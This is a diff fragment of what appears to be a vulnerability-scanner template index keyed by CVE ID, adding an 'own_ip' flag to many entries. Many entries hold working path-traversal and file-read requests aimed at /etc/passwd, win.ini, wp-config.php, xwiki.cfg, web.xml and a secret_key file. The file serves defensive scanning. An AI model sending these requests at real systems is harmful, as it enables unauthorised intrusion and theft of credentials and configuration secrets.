-      "request": "GET /assets/../../.HTTP/HTTP.db HTTP/1.1"
+      "request": "GET /assets/../../.HTTP/HTTP.db HTTP/1.1",
+      "own_ip": true
     },
     {
       "id": "CVE-2025-2294",
@@ -14787,7 +14956,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/"
+      "request": "GET {{BaseURL}}/",
+      "own_ip": true
     },
     {
       "id": "CVE-2025-24799",
@@ -14835,7 +15005,8 @@
         "vuln",
         "vkev"
       ],
-      "request": "GET /__screenshot-error?file=/etc/passwd HTTP/1.1"
+      "request": "GET /__screenshot-error?file=/etc/passwd HTTP/1.1",
+      "own_ip": true
     },
     {
       "id": "CVE-2025-25037",
@@ -14867,7 +15038,8 @@
         "wp",
         "vkev"
       ],
-      "request": "GET /?rest_route=/age-gate/v3/check HTTP/1.1"
+      "request": "GET /?rest_route=/age-gate/v3/check HTTP/1.1",
+      "own_ip": true
     },
     {
       "id": "CVE-2025-25257",
@@ -15004,7 +15176,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/rest.html"
+      "request": "GET {{BaseURL}}/rest.html",
+      "own_ip": true
     },
     {
       "id": "CVE-2025-27817",
@@ -15055,7 +15228,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/api/BetterImageGallery/imagehandler?path=../../../Web.Config"
+      "request": "GET {{BaseURL}}/api/BetterImageGallery/imagehandler?path=../../../Web.Config",
+      "own_ip": true
     },
     {
       "id": "CVE-2025-29085",
@@ -15104,7 +15278,8 @@
         "vuln",
         "kev"
       ],
-      "request": "GET /@fs/C:/windows/win.ini?import\u0026?inline=1.wasm?init HTTP/1.1"
+      "request": "GET /@fs/C:/windows/win.ini?import\u0026?inline=1.wasm?init HTTP/1.1",
+      "own_ip": true
     },
     {
       "id": "CVE-2025-31161",
@@ -15370,7 +15545,8 @@
         "vkev",
         "passive"
       ],
-      "request": "GET {{BaseURL}}/helpdesk/WebObjects/Helpdesk.woa"
+      "request": "GET {{BaseURL}}/helpdesk/WebObjects/Helpdesk.woa",
+      "own_ip": true
     },
     {
       "id": "CVE-2025-41646",
@@ -15455,7 +15631,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/tileserver.php/x/1/1/1?Format=/../../../../../../../../../../../../../../etc/passwd\u0026Request=x\u0026layer=."
+      "request": "GET {{BaseURL}}/tileserver.php/x/1/1/1?Format=/../../../../../../../../../../../../../../etc/passwd\u0026Request=x\u0026layer=.",
+      "own_ip": true
     },
     {
       "id": "CVE-2025-44177",
@@ -15472,7 +15649,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET /pt3upd/..%2f..%2f..%2f..%2fetc%2fpasswd HTTP/1.1"
+      "request": "GET /pt3upd/..%2f..%2f..%2f..%2fetc%2fpasswd HTTP/1.1",
+      "own_ip": true
     },
     {
       "id": "CVE-2025-47539",
@@ -15711,7 +15889,8 @@
         "vuln",
         "vkev"
       ],
-      "request": "GET {{BaseURL}}/xwiki/webjars/wiki%3Axwiki/..%2F..%2F..%2F..%2F..%2FWEB-INF%2Fxwiki.cfg"
+      "request": "GET {{BaseURL}}/xwiki/webjars/wiki%3Axwiki/..%2F..%2F..%2F..%2F..%2FWEB-INF%2Fxwiki.cfg",
+      "own_ip": true
     },
     {
       "id": "CVE-2025-55748",
@@ -15726,7 +15905,8 @@
         "vuln",
         "vkev"
       ],
-      "request": "GET {{BaseURL}}/bin/ssx/Main/WebHome?resource=../../WEB-INF/xwiki.cfg\u0026minify=false"
+      "request": "GET {{BaseURL}}/bin/ssx/Main/WebHome?resource=../../WEB-INF/xwiki.cfg\u0026minify=false",
+      "own_ip": true
     },
     {
       "id": "CVE-2025-55749",
@@ -15741,7 +15921,8 @@
         "vuln",
         "vkev"
       ],
-      "request": "GET {{BaseURL}}/webapps/xwiki/WEB-INF/xwiki.properties"
+      "request": "GET {{BaseURL}}/webapps/xwiki/WEB-INF/xwiki.properties",
+      "own_ip": true
     },
     {
       "id": "CVE-2025-58179",
@@ -15857,7 +16038,8 @@
         "lfi",
         "vkev"
       ],
-      "request": "GET /bi/api/Portal/LoginWithV8/?ticket=/../../../../Windows/win.ini HTTP/1.1"
+      "request": "GET /bi/api/Portal/LoginWithV8/?ticket=/../../../../Windows/win.ini HTTP/1.1",
+      "own_ip": true
     },
     {
       "id": "CVE-2025-68043",
@@ -15872,7 +16054,8 @@
         "lottiefiles",
         "vkev"
       ],
-      "request": "GET /wp-json/lottiefiles/v1/settings/ HTTP/1.1"
+      "request": "GET /wp-json/lottiefiles/v1/settings/ HTTP/1.1",
+      "own_ip": true
     },
     {
       "id": "CVE-2025-69200",
@@ -16063,7 +16246,8 @@
         "wp-responsive-images",
         "vkev"
       ],
-      "request": "GET /wp-content/plugins/wp-responsive-images/image_handler.php?src=/wp-config.php HTTP/1.1"
+      "request": "GET /wp-content/plugins/wp-responsive-images/image_handler.php?src=/wp-config.php HTTP/1.1",
+      "own_ip": true
     },
     {
       "id": "CVE-2026-1581",
@@ -16168,7 +16352,8 @@
         "vkev",
         "kev"
       ],
-      "request": "GET /download/resources/jira.webresources:color-picker-popup/images/..::..::..::..::..::WEB-INF::web.xml HTTP/1.1"
+      "request": "GET /download/resources/jira.webresources:color-picker-popup/images/..::..::..::..::..::WEB-INF::web.xml HTTP/1.1",
+      "own_ip": true
     },
     {
       "id": "CVE-2026-21643",
@@ -16389,7 +16574,8 @@
         "traversal",
         "vkev"
       ],
-      "request": "GET {{BaseURL}}/api/v1/files/profile_pictures/../secret_key"
+      "request": "GET {{BaseURL}}/api/v1/files/profile_pictures/../secret_key",
+      "own_ip": true
     },
     {
       "id": "CVE-2026-35616",
